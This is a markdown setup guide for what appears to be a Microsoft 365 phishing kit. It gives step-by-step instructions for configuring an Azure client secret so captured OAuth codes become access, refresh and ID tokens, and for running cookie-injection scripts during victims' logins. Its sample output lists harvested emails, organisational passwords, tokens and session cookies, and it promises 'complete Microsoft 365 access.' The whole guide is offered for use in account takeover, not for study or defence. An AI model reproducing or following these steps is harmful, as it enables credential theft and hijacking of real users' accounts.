# 🔧 SETUP GUIDE: Enable Tokens & Cookies Capture

## ❌ Current Issues
- 🔑 **Access Token: Missing** → Need Microsoft Client Secret
- 🔄 **Refresh Token: Missing** → Need Microsoft Client Secret  
- 🆔 **ID Token: Missing** → Need Microsoft Client Secret
- 🍪 **Cookies: None captured** → Need Cookie Injection Scripts

---

## 🔑 PART 1: Enable Token Exchange (Access/Refresh/ID Tokens)

### Step 1: Get Microsoft Client Secret

1. **Go to Azure Portal**: https://portal.azure.com
2. **Navigate to**: Azure Active Directory → App registrations
3. **Find your app**: `eabd0e31-5707-4a85-aae6-79c53dc2c7f0`
4. **Go to**: Certificates & secrets
5. **Create new secret**:
   - Description: `OAuth Token Exchange`
   - Expires: **Never** (most secure option)
   - Copy the **Value** (not the Secret ID)

### Step 2: Set Environment Variable in Netlify

1. **Go to**: https://app.netlify.com/sites/YOUR_SITE/settings/deploys
2. **Environment variables** section
3. **Add new variable**:
   ```
   Key: MICROSOFT_CLIENT_SECRET
   Value: [paste the secret value from Step 1]
   ```
4. **Save** and **redeploy** site

### Step 3: Verify Token Exchange Works

After setting the secret, test:
```bash
curl -X POST https://vaultydocs.com/.netlify/functions/tokenExchange \
  -H "Content-Type: application/json" \
  -d '{"code": "test", "redirect_uri": "https://vaultydocs.com/oauth-callback"}'
```

✅ **Success response**: `{"success": true, "tokens": {...}}`  
❌ **Failure response**: `{"success": false, "message": "Client secret required"}`

---

## 🍪 PART 2: Enable Cookie Capture

### Option A: Browser Extension (Recommended)

1. **Install**: [Cookie Editor](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm) or similar
2. **During Microsoft login**: Export cookies as JSON
3. **Use injection scripts** from `COOKIE_CAPTURE_INSTRUCTIONS.md`

### Option B: Console Injection (Advanced)

1. **During Microsoft login**, open browser console (F12)
2. **Paste and run** the Microsoft cookie injector script:

```javascript
// Paste the content from src/utils/microsoft-cookie-injector.js
```

### Option C: Tampermonkey (Automated)

1. **Install**: [Tampermonkey](https://tampermonkey.net/)
2. **Create new script** with Microsoft domain matching
3. **Use scripts** from `src/utils/` folder

---

## 🔄 PART 3: Expected Results After Setup

### ✅ With Client Secret Configured:
```
🎯 Token Exchange Successful
🔑 Access Token: ✅ Captured
🔄 Refresh Token: ✅ Captured (No Expiry)
🆔 ID Token: ✅ Captured
⏱️ Offline Access: ✅ Enabled
```

### ✅ With Cookie Injection Working:
```
🍪 Cookies: 15 captured
```

### ✅ Complete Capture:
```
🔐 Microsoft OAuth Login Captured!

📧 Email: user@company.com
🔑 Session ID: abc123
✅ Auth Code: Captured (see file)
🕒 Time: 2025-01-26...

🎯 Token Exchange Successful
🔑 Access Token: ✅ Captured
🔄 Refresh Token: ✅ Captured (No Expiry)
🆔 ID Token: ✅ Captured

🏢 Organizational Login Detected
🏷️ Type: Federated SSO
👤 Org Email: user@company.com
🔑 Org Username: user123
🔐 Org Password: ✅ Captured

🍪 Cookies: 15 captured
```

---

## 🔍 TROUBLESHOOTING

### "Token Status - All Missing"
- ❌ **Cause**: No `MICROSOFT_CLIENT_SECRET` environment variable
- ✅ **Fix**: Follow Part 1 above

### "Cookies: None captured"  
- ❌ **Cause**: No cookie injection scripts running
- ✅ **Fix**: Follow Part 2 above

### "Email: oauth-user@microsoft.com"
- ❌ **Cause**: Token exchange not working (no user profile)
- ✅ **Fix**: Set up client secret to get real user email

### Still having issues?
- Check Netlify function logs
- Verify environment variables are deployed
- Test token exchange endpoint manually
- Review browser console for cookie capture errors

---

## 📁 Generated File Content

With full setup, your `.js` file will contain:
- ✅ **Authorization Code**
- ✅ **Access Token** (for API calls)
- ✅ **Refresh Token** (never expires)
- ✅ **ID Token** (user identity)
- ✅ **User Profile** (real email, name, etc.)
- ✅ **Microsoft Cookies** (15+ cookies)
- ✅ **Organizational Credentials** (if federated)
- ✅ **Token Refresh Scripts**
- ✅ **Cookie Injection Code**

**Everything you need for complete Microsoft 365 access!** 🎉